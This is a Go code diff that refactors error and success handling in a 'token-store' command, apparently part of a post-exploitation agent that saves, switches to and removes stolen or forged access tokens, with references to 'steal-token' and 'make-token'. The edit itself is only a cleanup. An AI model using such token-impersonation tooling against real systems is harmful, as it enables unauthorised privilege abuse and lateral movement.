@@ -26,11 +26,7 @@ func (c *TokenStoreCommand) Execute(task structs.Task) structs.CommandResult {
 	var args tokenStoreArgs
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error parsing parameters: %v", err)
 		}
 	}
 
@@ -48,11 +44,7 @@ func (c *TokenStoreCommand) Execute(task structs.Task) structs.CommandResult {
 	case "remove":
 		return tokenStoreRemove(args.Name)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s (use save, list, use, remove)", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s (use save, list, use, remove)", args.Action)
 	}
 }
 
@@ -76,29 +68,17 @@ func tokenStoreSave(name string) structs.CommandResult {
 	}
 
 	if err := SaveTokenToStore(name, source); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error saving token: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error saving token: %v", err)
 	}
 
 	identity, _ := GetCurrentIdentity()
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("Saved current token as %q (%s)", name, identity),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("Saved current token as %q (%s)", name, identity)
 }
 
 func tokenStoreList() structs.CommandResult {
 	store := ListTokenStore()
 	if len(store) == 0 {
-		return structs.CommandResult{
-			Output:    "Token store is empty. Use steal-token or make-token, then token-store -action save -name <label>",
-			Status:    "success",
-			Completed: true,
-		}
+		return successResult("Token store is empty. Use steal-token or make-token, then token-store -action save -name <label>")
 	}
 
 	// Sort names for consistent output
@@ -162,18 +142,10 @@ func tokenStoreUse(name string) structs.CommandResult {
 
 	identity, err := UseTokenFromStore(name)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error restoring token %q: %v", name, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error restoring token %q: %v", name, err)
 	}
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("Switched to token %q\nOld: %s\nNew: %s", name, oldIdentity, identity),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("Switched to token %q\nOld: %s\nNew: %s", name, oldIdentity, identity)
 }
 
 func tokenStoreRemove(name string) structs.CommandResult {
@@ -186,16 +158,8 @@ func tokenStoreRemove(name string) structs.CommandResult {
 	}
 
 	if err := RemoveTokenFromStore(name); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("Removed token %q from store", name),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("Removed token %q from store", name)
 }
